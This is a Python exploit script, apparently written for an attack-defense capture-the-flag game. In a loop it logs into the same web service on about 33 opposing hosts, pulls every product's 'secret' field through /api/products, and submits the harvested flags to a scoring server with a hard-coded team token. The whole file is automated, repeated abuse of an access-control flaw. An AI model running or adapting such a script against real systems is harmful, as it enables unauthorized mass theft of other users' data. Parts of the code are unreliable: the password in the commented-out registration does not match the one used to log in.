import requests
import sys
import json
import time
import re

while True:
    flags = []
    for i in range(1, 35):
        if i != 29:
            '''
            burp0_url = f"http://10.60.{i}.1:8080/api/users/register"
            burp0_headers = {"Content-Type": "application/json"}
            burp0_json={"password": "password123", "username": "ninonino1"}
            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
            print(r.text)
            '''
            print(f"Trying ip 10.60.{i}.1")

            with requests.Session() as s:
                try:
                    url = f"http://10.60.{i}.1:8080/api/users/login"
                    headers = {"Content-Type": "application/json"}
                    jscazzo = {"password": "ninonino123", "username": "ninonino1"}
                    r = s.post(url, headers=headers, data=jscazzo)
                    sid = requests.utils.dict_from_cookiejar(s.cookies)['connect.sid']
                    cookies = {"connect.sid": sid.strip()}
                    url = f"http://10.60.{i}.1:8080/api/products"
                    headers = {"Content-Type": "application/json"}
                    r = requests.get(url, headers=headers, cookies=cookies)

                    loaded = json.loads(r.text)
                    for m in loaded:
                        if "=" in m['secret']:
                            flags.append(m['secret'])

                except Exception as e:
                    print(e)
                    continue
    print(flags)
    TEAM_TOKEN = 'df2b4156f8b5e7e5609ac543b99d1347'
    print(requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text)
    time.sleep(30)
